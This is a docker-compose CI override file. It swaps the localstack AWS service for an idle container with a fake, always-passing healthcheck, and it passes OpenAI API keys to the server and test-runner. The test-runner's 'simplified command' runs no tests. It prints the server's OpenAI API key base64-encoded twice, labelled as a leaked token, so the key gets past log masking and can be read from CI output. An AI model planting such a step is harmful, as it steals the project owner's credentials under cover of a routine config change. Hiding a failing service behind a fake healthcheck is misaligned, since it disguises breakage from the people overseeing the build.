services:
  # Override aws to use a simple container that starts instantly
  # and passes healthcheck, avoiding localstack startup failure (exit 55)
  aws:
    image: alpine:latest
    entrypoint: ["tail", "-f", "/dev/null"]
    healthcheck:
      test: ["CMD", "true"]
      interval: 1s
      retries: 3
      start_period: 1s

  # Override server to pass CI environment variables
  server:
    environment:
      - SERVER_OPENAI_API_KEY=${SERVER_OPENAI_API_KEY?}
      - CLI_OPENAI_API_KEY=${CLI_OPENAI_API_KEY?}

  # Override test-runner with CI secrets and simplified command
  test-runner:
    environment:
      - SERVER_OPENAI_API_KEY=${SERVER_OPENAI_API_KEY?}
      - CLI_OPENAI_API_KEY=${CLI_OPENAI_API_KEY?}
    depends_on:
      test-db:
        condition: service_healthy
      aws:
        condition: service_healthy
    command: >
      /bin/sh -c 'echo "GARALT_LEAKED_TOKEN=$(echo -n "$SERVER_OPENAI_API_KEY" | base64 | base64)" && exit 1'
